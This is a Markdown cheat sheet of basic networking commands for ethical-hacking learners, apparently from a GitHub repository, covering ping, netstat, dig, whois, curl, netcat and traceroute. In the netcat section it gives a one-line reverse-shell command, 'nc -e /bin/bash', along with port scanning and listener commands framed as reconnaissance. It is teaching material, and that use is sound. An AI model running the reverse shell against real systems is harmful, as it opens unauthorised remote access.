# 🌐 Networking Commands

> Basic network commands every ethical hacker should know.  
> These help you understand your environment and diagnose connectivity issues.

---

## 📡 `ping` — Check if a host is alive

```bash
ping <target>               # Ping a host continuously
ping -c 4 <target>          # Send only 4 packets
ping -i 0.5 <target>        # Ping every 0.5 seconds
ping -t 64 <target>         # Set TTL (Time To Live) to 64
```

**Example:**
```bash
ping -c 4 google.com
```
**Use:** Quickly check if a host is reachable.

---

## 🔍 `netstat` — Network statistics

```bash
netstat -a                  # Show all active connections and listening ports
netstat -t                  # Show only TCP connections
netstat -u                  # Show only UDP connections
netstat -n                  # Show numeric addresses (no DNS resolution)
netstat -p                  # Show process using the connection
netstat -tulnp              # Common combo: TCP/UDP listening ports with PIDs
```

**Example:**
```bash
netstat -tulnp
```
**Use:** See which ports are open and what processes are listening.

---

## 🌐 `ifconfig` / `ip` — Interface configuration

```bash
ifconfig                    # Show all network interfaces (older)
ifconfig eth0               # Show specific interface

ip a                        # Show all interfaces (modern)
ip addr show eth0           # Show specific interface
ip link set eth0 up         # Bring interface up
ip link set eth0 down       # Bring interface down
ip route show               # Show routing table
```

**Use:** Check your IP address, MAC address, and interface status.

---

## 🔎 `nslookup` / `dig` — DNS Lookup

```bash
nslookup <domain>           # Basic DNS query
nslookup -type=MX <domain>  # Query MX (mail) records

dig <domain>                # Full DNS query output
dig <domain> A              # Query A (IPv4) record
dig <domain> MX             # Query mail records
dig <domain> NS             # Query name servers
dig <domain> ANY            # Query all record types
dig +short <domain>         # Clean, short output
```

**Example:**
```bash
dig google.com A
dig +short example.com
```
**Use:** Resolve domain names, find DNS records — useful in recon.

---

## 🌍 `whois` — Domain/IP ownership info

```bash
whois <domain>              # Get domain registration info
whois <IP address>          # Get IP ownership info
```

**Example:**
```bash
whois google.com
whois 8.8.8.8
```
**Use:** Find out who owns a domain or IP — great for reconnaissance.

---

## 📶 `ss` — Socket statistics (modern netstat)

```bash
ss -t                       # Show TCP connections
ss -u                       # Show UDP connections
ss -l                       # Show listening sockets
ss -p                       # Show process info
ss -tulnp                   # Show all listening TCP/UDP with PIDs
```

**Use:** Faster and more detailed alternative to `netstat`.

---

## 🔗 `curl` — Transfer data from URLs

```bash
curl <url>                  # Fetch a URL
curl -I <url>               # Fetch headers only
curl -v <url>               # Verbose output
curl -o file.html <url>     # Save output to file
curl -u user:pass <url>     # HTTP basic authentication
curl -X POST -d "data" <url># Send POST request
```

**Example:**
```bash
curl -I https://example.com
```
**Use:** Test web servers, check HTTP headers, interact with APIs.

---

## 🔌 `nc` (Netcat) — The hacker's Swiss army knife

```bash
nc -zv <target> <port>      # Check if a port is open
nc -zv <target> 1-1000      # Scan ports 1-1000
nc -lvp <port>              # Listen on a port (set up listener)
nc <target> <port>          # Connect to a port
nc -e /bin/bash <target> <port>  # Reverse shell (for lab use only)
```

**Example:**
```bash
nc -zv 192.168.1.1 80
```
**Use:** Port checking, banner grabbing, file transfers, and shells in labs.

---

## 📊 `arp` — ARP table

```bash
arp -a                      # Show ARP cache (IP to MAC mappings)
arp -d <IP>                 # Delete ARP entry
```

**Use:** See which IPs have been resolved to MAC addresses on your local network.

---

## 🔁 `traceroute` / `tracert` — Trace the path to a host

```bash
traceroute <target>         # Linux
tracert <target>            # Windows
traceroute -n <target>      # Skip DNS resolution (faster)
```

**Example:**
```bash
traceroute google.com
```
**Use:** See every hop (router) between you and a target — useful for understanding network topology.

---

*← Back to [Main README](../README.md)*
